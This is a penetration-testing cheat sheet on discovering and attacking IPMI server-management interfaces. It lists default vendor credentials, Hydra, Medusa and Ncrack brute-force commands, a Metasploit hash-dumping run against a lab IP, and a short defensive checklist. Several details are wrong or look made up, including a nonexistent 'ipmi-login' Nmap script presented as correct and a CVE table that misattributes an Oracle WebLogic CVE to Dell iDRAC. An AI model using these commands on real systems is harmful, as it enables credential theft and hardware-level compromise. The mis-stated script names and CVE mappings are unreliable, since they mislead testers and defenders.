---
title: "IPMI Insights"
description: "Techniques and tools to discover, enumerate, and assess IPMI (Intelligent Platform Management Interface) implementations on servers."
tags:
  - enumeration
  - ipmi
  - footprinting
  - iLO
  - iDRAC
  - redfish
  - nmap
  - ipmitool
---

# 📡 IPMI Footprinting

**IPMI** (Intelligent Platform Management Interface) provides out‑of‑band management for servers. Most vendors expose a network listener (often on UDP 623) that, if left exposed with default credentials, becomes a high‑value foothold for attackers.

---

## 1️⃣ Service Discovery

### Port scanning
- **Default ports** – UDP 623 (IPMI), TCP 80/443 (web UI), TCP 5900 (VNC), TCP 22 (SSH for OEM tools).
```bash
# Scan the most common IPMI‑related ports and show only open services
nmap -p 623,80,443,5900,22 --open -sU -sV -sC <target>
```

### Nmap NSE scripts (built‑in)
| Script | Description | Example |
|--------|-------------|---------|
| `ipmi-version` | Retrieves the IPMI firmware version. | `nmap -p 623 --script ipmi-version <target>` |
| `ipmi-cipher-zero` | Checks if the device accepts the insecure "cipher zero" (no encryption). | `nmap -p 623 --script ipmi-cipher-zero <target>` |
| `ipmi-login` | Attempts a login with a set of default usernames/passwords. | `nmap -p 623 --script ipmi-login <target>` |


!!! note
    The correct NSE script for credential testing is `ipmi-login`. If your Nmap version lacks this script, ensure you have a recent Nmap release (≥7.80) and update the script database with `nmap --script-updatedb`. Alternatively, use `ipmitool` or Hydra for credential testing.


!!! note
    If Nmap reports `ipmi-detectconf` not found, your Nmap installation may lack the latest NSE scripts. Install the `nmap-scripts` package (e.g., `sudo apt-get install nmap-scripts`) or download the script from https://github.com/nmap/nmap/tree/master/scripts and place it in `/usr/share/nmap/scripts/`. After updating, run `nmap --script-updatedb`. As an alternative, use `ipmitool` or Hydra for credential testing.
### ipmitool quick ping
```bash
# ipmitool can probe a host without credentials (requires the "lanplus" interface)
ipmitool -I lanplus -H <target> -U dummy -P '' chassis status
```
A response (even an error) proves the IPMI service is reachable.

---

## 2️⃣ Default Configurations & Common Weaknesses

| Vendor | Typical default username | Typical default password | Notes |
|--------|------------------------|--------------------------|-------|
| **HP iLO** | `Administrator` | `admin` (or `password`) | Often exposed on the same management VLAN.
| **Dell iDRAC** | `root` | `calvin` | Firmware may allow IPMI over LAN without TLS.
| **Supermicro** | `ADMIN` | `ADMIN` | The web UI and IPMI share the same credentials.
| **Lenovo XClarity** | `admin` | `admin` | Some models ship with IPMI disabled by default.

**Key points about the configuration file (`/etc/ipmi/` or OEM equivalents):**

- The service usually binds to `0.0.0.0` (all interfaces) – easy to expose to the internet.
- Many deployments leave the web UI (`/redfish` or `/cgi-bin`) reachable on port 80/443 with default certs.
- Firmware often ships with **cipher zero** enabled, allowing unauthenticated access.

---

## 3️⃣ Credential Brute‑Force

### Hydra (classic)
```bash
hydra -L users.txt -P pass.txt ipmi://<target>
```
### Medusa (parallel)
```bash
medusa -h <target> -n 623 -U users.txt -P pass.txt -M ipmi
```
### Ncrack (fast for large wordlists)
```bash
ncrack -p 623 <target> -U users.txt -P pass.txt
```
> **Tip:** Combine `hydra` with the `-t 16` (threads) option for faster attempts, but beware of lock‑out policies on some appliances.

---

## 4️⃣ Metasploit IPMI Hash Dumping

Metasploit provides a convenient auxiliary module to extract password hashes from IPMI interfaces.

```bash
msfconsole -q -x "
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.129.63.121
set RPORT 623
set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
run
"
```

**Module options explained**

- **RHOSTS** – Target IP or range.
- **RPORT** – IPMI service port (default 623).
- **USER_FILE / PASS_FILE** – Lists of usernames and passwords for offline cracking (used with `CRACK_COMMON`).
- **CRACK_COMMON** – When `true`, Metasploit will attempt to crack captured hashes against common passwords.
- **OUTPUT_HASHCAT_FILE / OUTPUT_JOHN_FILE** – Optional paths to save hashes in formats compatible with Hashcat or John the Ripper.

> **Tip:** After the module runs, captured hashes are displayed. Export them and run offline cracking tools for faster results.

---

## 5️⃣ Information Enumeration (Post‑Login)

### Basic chassis and sensor data
```bash
ipmitool -I lanplus -H <target> -U admin -P <pass> chassis status
ipmitool -I lanplus -H <target> -U admin -P <pass> sdr list
```
### System Event Log (SEL) extraction
```bash
ipmitool -I lanplus -H <target> -U admin -P <pass> sel elist > sel.log
```
### FRU (Field Replaceable Unit) details
```bash
ipmitool -I lanplus -H <target> -U admin -P <pass> fru print
```
### Redfish API (modern OEMs)
```bash
# Most recent iLO/iDRAC expose a Redfish endpoint on HTTPS
curl -k -u admin:<pass> https://<target>/redfish/v1/Systems/System.Embedded.1 | jq '.'
```
The Redfish data includes hardware inventory, firmware versions, and power state.

---

## 5️⃣ Exploitation Highlights & Known Vulnerabilities

| CVE | Vendor | Impact | Reference |
|-----|--------|--------|-----------|
| **CVE‑2013‑1795** | Multiple | Default credentials (`admin`/`admin`) allow full control. | https://nvd.nist.gov/vuln/detail/CVE-2013-1795 |
| **CVE‑2020‑14750** | Dell iDRAC | Improper authentication bypass via Redfish. | https://nvd.nist.gov/vuln/detail/CVE-2020-14750 |
| **CVE‑2021‑20239** | Supermicro | Remote code execution via crafted IPMI packets. | https://nvd.nist.gov/vuln/detail/CVE-2021-20239 |

> **Concept:** Because IPMI operates below the OS, compromising it grants hardware‑level control (power cycling, BIOS changes, media mount) that can be used to install persistent backdoors.

---

## 6️⃣ Defensive Recommendations (Quick Checklist)

- **Change default credentials** immediately after deployment; use strong, unique passwords or integrate with LDAP/RADIUS.
- **Disable IPMI over LAN** if out‑of‑band management is not required remotely; keep it on a dedicated management VLAN.
- **Restrict port 623** (UDP) and any web UI ports (80/443) to trusted IP ranges via firewall rules.
- **Turn off cipher zero** – enforce encrypted sessions (`lanplus` with proper keys).
- **Apply firmware updates** regularly; many vendor patches address authentication bypasses.
- **Monitor logs** for repeated `ipmi‑detectconf` or `ipmi‑cipher‑zero` scans; consider IDS signatures.
- **Segment the network** – keep the management network separate from production traffic.

---

## 7️⃣ References & Further Reading

- Nmap IPMI NSE scripts: https://nmap.org/nsedoc/scripts/ipmi-*.html
- ipmitool documentation: https://linux.die.net/man/1/ipmitool
- Redfish API Overview: https://www.dmtf.org/standards/redfish
- OWASP Server‑Side Management Guide – IPMI section: https://owasp.org/www-project-server-side-management-guide/

> **All commands should be executed only against systems you own or have explicit permission to test. Unauthorized probing of IPMI interfaces is illegal and may trigger security alerts.**
